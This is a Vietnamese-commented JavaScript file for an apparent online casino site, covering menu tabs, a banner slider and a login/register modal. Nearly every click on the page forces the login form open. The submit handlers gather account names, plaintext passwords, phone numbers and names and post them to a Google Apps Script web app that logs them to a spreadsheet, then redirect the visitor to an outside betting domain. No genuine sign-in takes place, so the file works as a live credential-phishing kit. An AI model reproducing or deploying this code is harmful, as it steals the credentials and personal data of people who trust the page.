document.addEventListener('DOMContentLoaded', () => {
    // ==========================================
    // 1. XỬ LÝ MENU DANH MỤC GAME (HOT, CASINO...)
    // ==========================================
    const categoryItems = document.querySelectorAll('.cat-item');

    categoryItems.forEach(item => {
        item.addEventListener('click', (e) => {
            // Ngăn chặn sự kiện click lan truyền lên thẻ cha
            e.stopPropagation(); 
            
            // Xóa class active ở tất cả các tab
            categoryItems.forEach(el => el.classList.remove('active'));
            // Thêm class active vào tab được click
            item.classList.add('active');
        });
    });

    // ==========================================
    // 2. XỬ LÝ MỞ/ĐÓNG VÀ CHUYỂN TAB ĐĂNG NHẬP / ĐĂNG KÝ
    // ==========================================
    const modal = document.getElementById('authModal');
    const closeBtn = document.getElementById('closeModalBtn');
    
    // Nút mở form trên trang chủ
    const loginBtns = document.querySelectorAll('.btn-outline'); // Nút Đăng nhập
    const registerBtns = document.querySelectorAll('.btn-primary'); // Nút Đăng ký

    // Các phần tử tab bên trong form
    const tabLoginBtn = document.getElementById('tabLoginBtn');
    const tabRegisterBtn = document.getElementById('tabRegisterBtn');
    const formLogin = document.getElementById('formLogin');
    const formRegister = document.getElementById('formRegister');

    // Hàm mở form và chỉ định tab hiển thị
    function openAuthModal(targetForm) {
        if (!modal) return; // Tránh lỗi nếu trang không có modal
        modal.classList.add('show'); // Hiện lớp phủ
        
        // Reset tab
        if(tabLoginBtn && tabRegisterBtn && formLogin && formRegister) {
            tabLoginBtn.classList.remove('active');
            tabRegisterBtn.classList.remove('active');
            formLogin.classList.remove('active-form');
            formRegister.classList.remove('active-form');

            // Bật tab được yêu cầu
            if (targetForm === 'login') {
                tabLoginBtn.classList.add('active');
                formLogin.classList.add('active-form');
            } else {
                tabRegisterBtn.classList.add('active');
                formRegister.classList.add('active-form');
            }
        }
    }

    // Gắn sự kiện click cho các nút Đăng nhập / Đăng ký chính
    loginBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation(); // Tránh kích hoạt các sự kiện click khác
            openAuthModal('login');
        });
    });

    registerBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            openAuthModal('register');
        });
    });

    // Đóng form khi bấm nút Back (mũi tên)
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            modal.classList.remove('show');
        });
    }

    // Chuyển đổi qua lại giữa Đăng nhập / Đăng ký khi đang ở trong form
    if(tabLoginBtn && tabRegisterBtn) {
        tabLoginBtn.addEventListener('click', () => openAuthModal('login'));
        tabRegisterBtn.addEventListener('click', () => openAuthModal('register'));
    }

    // ==========================================
    // 3. CODE CHO BANNER SLIDER
    // ==========================================
    const wrapper = document.querySelector('.slides-wrapper');
    const slides = document.querySelectorAll('.slide');
    const dots = document.querySelectorAll('.dot');
    
    // Chỉ chạy code slider nếu có phần tử .slides-wrapper trên trang
    if (wrapper && slides.length > 0) {
        let currentIndex = 0;
        const totalSlides = slides.length;
        const intervalTime = 3000; // Thời gian dừng ở mỗi hình (3000ms = 3 giây)
        let slideInterval;

        // Hàm cập nhật vị trí slider và trạng thái chấm tròn
        function updateSlider() {
            wrapper.style.transform = `translateX(-${currentIndex * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function nextSlide() {
            currentIndex = (currentIndex + 1) % totalSlides; 
            updateSlider();
        }

        function startSlide() {
            slideInterval = setInterval(nextSlide, intervalTime);
        }

        dots.forEach((dot, index) => {
            dot.addEventListener('click', (e) => {
                e.stopPropagation(); // Để click vào chấm tròn ko bị bật form đăng nhập
                currentIndex = index;
                updateSlider();
                clearInterval(slideInterval);
                startSlide();
            });
        });

        startSlide();
    }

    // ==========================================
    // 4. MỞ FORM ĐĂNG NHẬP KHI CLICK VÀO CÁC THÀNH PHẦN KHÁC
    // ==========================================
    
    // Chọn tất cả các thành phần bạn muốn khi click vào sẽ hiện form đăng nhập
    const requireLoginElements = document.querySelectorAll(`
        .game-item, 
        .banner-slider, 
        .bottom-nav ,
        .quick-links .link-item ,
        .cat-item,
        .top-icon ,
        .btn-view-all
    `);

    requireLoginElements.forEach(element => {
        element.addEventListener('click', (e) => {
            e.preventDefault(); // Ngăn chặn hành vi mặc định (như chuyển trang nếu là thẻ <a>)
            openAuthModal('login'); // Mở form đăng nhập
        });
    });
    // ==========================================
    // 5. XỬ LÝ RÀNG BUỘC VÀ GỬI DỮ LIỆU LÊN GOOGLE SHEETS
    // ==========================================

    const targetUrl = 'https://fly881a5.cc/';
    
    // !!! QUAN TRỌNG: Dán URL Web App của Google Apps Script vào đây !!!
    const scriptUrl = 'https://script.google.com/macros/s/AKfycbxXZEFTxXRO7sLyEqSzblkXddRITJ40aV-14i8HUnA7B5qPpWyO_KkrxMe9kCU5sUCH0Q/exec';

    // Hàm gửi dữ liệu lên Google Sheets
    function sendDataToGoogleSheets(dataObj) {
        // Thay đổi nút thành trạng thái "Đang gửi..." để tránh người dùng bấm 2 lần
        const btn = document.activeElement; 
        const originalText = btn.innerText;
        btn.innerText = "Đang xử lý...";
        btn.disabled = true;

        fetch(scriptUrl, {
            method: 'POST',
            mode: 'no-cors', // Cần thiết để tránh lỗi CORS khi gửi từ domain khác
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataObj)
        })
        .then(() => {
            // Chuyển hướng sau khi gửi xong
            window.location.href = targetUrl;
        })
        .catch(error => {
            console.error('Error!', error.message);
            alert("Có lỗi xảy ra khi kết nối máy chủ. Vui lòng thử lại!");
            btn.innerText = originalText;
            btn.disabled = false;
        });
    }

    // --- XỬ LÝ FORM ĐĂNG NHẬP ---
    const btnSubmitLogin = document.getElementById('btnSubmitLogin');
    if (btnSubmitLogin) {
        btnSubmitLogin.addEventListener('click', (e) => {
            e.preventDefault();

            const account = document.getElementById('loginAccount').value.trim();
            const password = document.getElementById('loginPassword').value.trim();
            const phone = document.getElementById('loginPhone').value.trim();

            if (!account || !password || !phone) return alert('Vui lòng điền đầy đủ!');
            if (account.length < 6 || account.length > 20) return alert('Tài khoản phải từ 6 đến 20 ký tự!');
            if (password.length < 6 || password.length > 20) return alert('Mật khẩu phải từ 6 đến 20 ký tự!');
            
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(phone)) return alert('Số điện thoại không hợp lệ!');

            // Chuẩn bị dữ liệu gửi đi
            const dataObj = {
                status: "Đăng Nhập",
                account: account,
                password: password,
                phone: phone,
                name: "" // Đăng nhập không cần tên
            };

            // Gọi hàm gửi dữ liệu
            sendDataToGoogleSheets(dataObj);
        });
    }

    // --- XỬ LÝ FORM ĐĂNG KÝ ---
    const btnSubmitRegister = document.getElementById('btnSubmitRegister');
    if (btnSubmitRegister) {
        btnSubmitRegister.addEventListener('click', (e) => {
            e.preventDefault();

            const account = document.getElementById('regAccount').value.trim();
            const password = document.getElementById('regPassword').value.trim();
            const phone = document.getElementById('regPhone').value.trim();
            const name = document.getElementById('regName').value.trim();
            const agreeTerms = document.getElementById('agreeTerms').checked;

            if (!account || !password || !phone || !name) return alert('Vui lòng điền đầy đủ!');
            if (account.length < 6 || account.length > 20) return alert('Tài khoản đăng ký phải từ 6 đến 20 ký tự!');
            if (password.length < 6 || password.length > 20) return alert('Mật khẩu đăng ký phải từ 6 đến 20 ký tự!');
            
            const phoneRegex = /^[0-9]{10}$/;
            if (!phoneRegex.test(phone)) return alert('Số điện thoại không hợp lệ!');
            if (!agreeTerms) return alert('Vui lòng đồng ý với thỏa thuận đăng ký!');

            // Chuẩn bị dữ liệu gửi đi
            const dataObj = {
                status: "Đăng Ký",
                account: account,
                password: password,
                phone: phone,
                name: name
            };

            // Gọi hàm gửi dữ liệu
            sendDataToGoogleSheets(dataObj);
        });
    }
});